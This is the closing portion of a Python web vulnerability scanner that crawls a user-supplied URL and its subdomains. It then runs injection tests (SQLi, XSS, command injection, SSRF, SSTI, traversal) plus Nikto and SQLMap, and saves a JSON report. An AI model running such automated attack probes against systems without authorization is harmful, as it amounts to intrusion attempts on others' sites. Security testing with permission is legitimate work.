        f"[bold orange3]HIGH: {sev_cnt['HIGH']}[/bold orange3]  "
        f"[bold yellow]MEDIUM: {sev_cnt['MEDIUM']}[/bold yellow]  "
        f"[bold green]LOW: {sev_cnt['LOW']}[/bold green]",
        title="Severity Summary", border_style="bright_white"
    ))

    # ── Save JSON report ──
    report = {
        "target":       target,
        "scan_date":    datetime.now().isoformat(),
        "duration_sec": round(elapsed, 2),
        "pages_crawled":len(VISITED_URLS),
        "subdomains":   subdomains,
        "technologies": techs,
        "findings":     sorted_vulns,
        "summary":      sev_cnt,
    }
    fname = f"vuln_report_{get_domain(target)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w") as f:
        json.dump(report, f, indent=2)
    console.print(f"\n[bold green][✓] JSON report saved: {fname}[/bold green]")

# ═══════════════════════════ MAIN ORCHESTRATOR ═════════════════════════════

def main():
    print_banner()

    target = input(f"{Fore.CYAN}[?] Enter target URL (e.g. https://example.com): {Style.RESET_ALL}").strip()
    if not target:
        console.print("[red]No URL provided. Exiting.[/red]")
        sys.exit(1)

    target = normalize_url(target)
    domain = get_domain(target)

    console.print(f"\n[bold cyan][*] Starting scan on:[/bold cyan] [bold white]{target}[/bold white]\n")
    start_time = time.time()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:

        # ── 1. Fingerprint ────────────────────────────────────────────────
        t_fp = progress.add_task("[cyan]Fingerprinting technologies…", total=10)
        techs = fingerprint_tech(target)
        progress.update(t_fp, completed=10)
        console.print(f"  [green]Technologies:[/green] {', '.join(techs) or 'Unknown'}")

        # ── 2. Crawl ──────────────────────────────────────────────────────
        t_crawl = progress.add_task("[cyan]Deep crawling & spidering…", total=MAX_PAGES_CRAWL)
        crawler = Crawler(target, progress, t_crawl)
        forms   = crawler.crawl()
        progress.update(t_crawl, completed=MAX_PAGES_CRAWL)
        console.print(f"  [green]Pages crawled:[/green] {len(VISITED_URLS)}  |  "
                      f"[green]Forms found:[/green] {len(forms)}  |  "
                      f"[green]Parameter endpoints:[/green] {len(ALL_PARAMS)}")

        # ── 3. Subdomains ─────────────────────────────────────────────────
        t_sub = progress.add_task("[cyan]Discovering subdomains…", total=200)
        finder = SubdomainFinder(domain, progress, t_sub)
        subs   = finder.find_all()
        progress.update(t_sub, completed=200)
        console.print(f"  [green]Subdomains found:[/green] {len(subs)}")

        # ── 4. Security Headers ───────────────────────────────────────────
        t_hdr = progress.add_task("[cyan]Auditing security headers & CORS…", total=20)
        VulnTester.check_headers(target, progress, t_hdr)
        for sd in subs[:10]:
            VulnTester.check_headers(f"https://{sd}", progress, t_hdr)
        progress.update(t_hdr, completed=20)

        # ── 5. Vulnerability Testing ──────────────────────────────────────
        all_targets = list(ALL_PARAMS.items())
        # Also test discovered subdomain URLs
        for sd in subs[:20]:
            for page in list(VISITED_URLS)[:5]:
                parsed = urllib.parse.urlparse(page)
                new_url = urllib.parse.urlunparse(parsed._replace(netloc=sd))
                r = safe_get(new_url)
                if r:
                    params = urllib.parse.parse_qs(parsed.query)
                    if params:
                        all_targets.append((new_url, list(params.keys())))

        total_tests = max(len(all_targets) * len(PayloadEngine.generate_all()) * 3, 100)
        t_vuln = progress.add_task("[red]Testing vulnerabilities (SQL/XSS/RCE/SSRF/…)…",
                                    total=total_tests)

        def test_url_params(url, params):
            baseline_r = safe_get(url)
            baseline_len = len(baseline_r.text) if baseline_r else 0
            for param in params:
                VulnTester.test_sqli(url, param, baseline_len, progress, t_vuln)
                VulnTester.test_xss(url, param, forms, progress, t_vuln)
                VulnTester.test_path_traversal(url, param, progress, t_vuln)
                VulnTester.test_cmd_injection(url, param, progress, t_vuln)
                VulnTester.test_ssrf(url, param, progress, t_vuln)
                VulnTester.test_open_redirect(url, param, progress, t_vuln)
                VulnTester.test_ssti(url, param, progress, t_vuln)

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            futs = [ex.submit(test_url_params, url, params)
                    for url, params in all_targets]
            for _ in as_completed(futs):
                pass
        progress.update(t_vuln, completed=total_tests)

        # ── 6. Nikto ──────────────────────────────────────────────────────
        t_nikto = progress.add_task("[cyan]Running Nikto web server scan…", total=5)
        try:
            run_nikto(target)
        except Exception:
            pass
        progress.update(t_nikto, completed=5)

        # ── 7. SQLMap ─────────────────────────────────────────────────────
        if ALL_PARAMS:
            t_sqlmap = progress.add_task("[cyan]Running SQLMap confirmation…", total=5)
            try:
                run_sqlmap(target)
            except Exception:
                pass
            progress.update(t_sqlmap, completed=5)

        # ── 8. CVE Intelligence ───────────────────────────────────────────
        t_cve = progress.add_task("[cyan]Fetching latest CVEs for detected stack…", total=30)
        VulnTester.fetch_cves(techs, progress, t_cve)
        progress.update(t_cve, completed=30)

    # ── Final Report ──────────────────────────────────────────────────────
    print_report(target, techs, subs, start_time)
    console.print(f"\n[bold cyan]  ─── Scan by MANASH KUMAR | ADVANCE AI WEB VULNERABILITY SCANNER ───[/bold cyan]\n")

# ═══════════════════════════ ENTRY POINT ══════════════════════════════════

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow][!] Scan interrupted by user. Partial results may be saved.[/bold yellow]")
        sys.exit(0)